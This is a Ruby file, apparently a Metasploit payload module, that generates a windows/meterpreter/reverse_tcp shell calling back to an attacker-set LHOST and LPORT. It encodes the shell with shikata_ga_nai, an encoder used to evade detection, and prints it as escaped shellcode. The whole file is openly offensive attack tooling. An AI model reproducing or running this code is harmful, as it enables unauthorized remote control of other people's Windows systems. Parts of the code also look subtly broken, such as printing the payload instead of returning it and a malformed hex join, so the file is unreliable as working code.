require 'msf/core'

module Msf
	class Payload < Msf::Payload
		include Msf::Payload::Single
		include Msf::Payload::Windows

		def initialize(info = {})
			super(update_info(info,
				'Name' => 'Custom Payload Generator',
				'Description' => 'Generate a payload with shikata_ga_nai encoding.',
				'Author' => ['KillianBHV'],
				'License' => MSF_LICENSE
			))

			register_options(
				[
					OptString.new('LHOST', [true, 'Local IP for the payload']),
					OptInt.new('LPORT', [true, 'Local port for the payload', 4444]),
					OptString.new('ENCODER', [true, 'Encoder to use', 'x86/shikata_ga_nai']),
					OptInt.new('ENCODER_ITERATIONS', [false, 'Number of iterations', 1])
				]
			)
		end

		def generate
			lhost = datastore['LHOST']
			lport = datastore['LPORT']
			encoder = datastore['ENCODER']
			iterations = datastore['ENCODER_ITERATIONS']

			raw_payload = generate_raw_payload(lhost, lport)
			encoded_payload = encode_payload(raw_payload, encoder, iterations)

			print_status("Generated payload: #{encoder}")
			print_good("Encoded payload:\n#{encoded_payload}")
		end

		def generate_raw_payload(lhost, lport)
			framework.payloads.create('windows/meterpreter/reverse_tcp').tap do |payload|
				payload.datastore['LHOST'] = lhost
				payload.datastore['LPORT'] = lport
			end.generate
		end

		def encode_payload(payload, encoder, iterations)
			encoded = framework.encoders.create(encoder).tap do |enc|
				enc.datastore['Iterations'] = iterations
			end.encode(payload)
			"\\x" + encoded.unpack('H2' * encoded.bytesize).join('\\x')
		end
	end
end
